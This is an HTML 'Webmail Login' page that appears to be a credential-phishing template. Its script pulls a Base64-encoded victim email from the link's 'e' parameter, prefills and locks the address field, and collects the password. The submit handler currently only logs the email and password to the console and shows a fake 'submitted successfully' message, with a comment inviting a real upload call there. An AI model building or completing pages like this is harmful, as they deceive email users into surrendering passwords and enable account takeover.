<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Webmail Login</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,400,500,700">
  <style>
    /* Basic Styles */
    body {
      font-family: "Roboto", sans-serif;
      margin: 0;
      padding: 0;
      background-color: #FAFAFA;
      color: #333;
    }

    #content {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background: #EAEAEA;
    }

    #form {
      background: #fff;
      padding: 20px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 400px;
    }

    .form-group {
      margin-bottom: 15px;
    }

    .form-label {
      font-size: 16px;
      color: #616161;
    }

    .form-field {
      width: 100%;
      padding: 10px;
      border: 1px solid #BDBDBD;
      border-radius: 4px;
      font-size: 16px;
      margin-top: 5px;
    }

    .form-button {
      width: 100%;
      padding: 10px;
      background-color: #0C7C84;
      color: #fff;
      font-size: 16px;
      border: none;
      cursor: pointer;
      margin-top: 20px;
      border-radius: 4px;
    }

    .error-message {
      color: red;
      font-size: 14px;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div id="content">
    <div id="form">
      <h2>Login to Webmail</h2>
      <div class="form-group">
        <label for="ai" class="form-label">Email Address</label>
        <input type="email" id="ai" name="username" class="form-field" placeholder="Enter your email" readonly />
        <p id="email-error" class="error-message"></p>
      </div>
      <div class="form-group">
        <label for="pr" class="form-label">Password</label>
        <input type="password" id="pr" name="password" class="form-field" placeholder="Enter your password" />
        <p id="password-error" class="error-message"></p>
      </div>
      <button type="submit" id="submit-btn" class="form-button">Log In</button>
      <p id="msg" class="error-message"></p>
    </div>
  </div>

  <script>
    // Function to get the URL parameter 'e' and decode the email
    function getEmailFromURL() {
      const urlParams = new URLSearchParams(window.location.search); // Get URL parameters
      const encodedEmail = urlParams.get('e'); // Get 'e' parameter

      if (encodedEmail) {
        console.log("Encoded email from URL:", encodedEmail); // Log the encoded email for debugging

        // Ensure the Base64 string is URL-safe by replacing URL encoded characters
        const emailBase64 = encodedEmail.replace(/-/g, '+').replace(/_/g, '/');

        try {
          // Decode Base64 email
          const decodedEmail = atob(emailBase64);

          console.log("Decoded email:", decodedEmail); // Log decoded email for debugging

          // Validate email format
          const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
          if (emailPattern.test(decodedEmail)) {
            document.getElementById('ai').value = decodedEmail; // Set email in input field
            document.getElementById('ai').setAttribute('readonly', true); // Make it read-only
            document.getElementById('email-error').textContent = ''; // Clear any error message
          } else {
            throw new Error('Invalid email format');
          }
        } catch (error) {
          console.error('Error decoding email:', error);
          document.getElementById('email-error').textContent = 'Error decoding email. Invalid format or Base64 string.';
        }
      } else {
        document.getElementById('email-error').textContent = 'No email provided in the URL.';
      }
    }

    // Function to handle form submission
    document.getElementById('submit-btn').addEventListener('click', function (event) {
      event.preventDefault(); // Prevent form submission
      const email = document.getElementById('ai').value;
      const password = document.getElementById('pr').value;

      // Validate fields
      let hasError = false;

      if (!email || !password) {
        hasError = true;
        document.getElementById('msg').textContent = 'Both email and password are required.';
      }

      // If no errors, you can proceed with the form submission (AJAX, etc.)
      if (!hasError) {
        // Example: send data to server
        console.log('Email:', email, 'Password:', password);

        // Simulate form submission success (you can replace this with an actual AJAX call)
        document.getElementById('msg').textContent = 'Form submitted successfully!';
      }
    });

    // Call the function to extract the email from URL when the page loads
    window.onload = function () {
      getEmailFromURL();
    };
  </script>
</body>
</html>
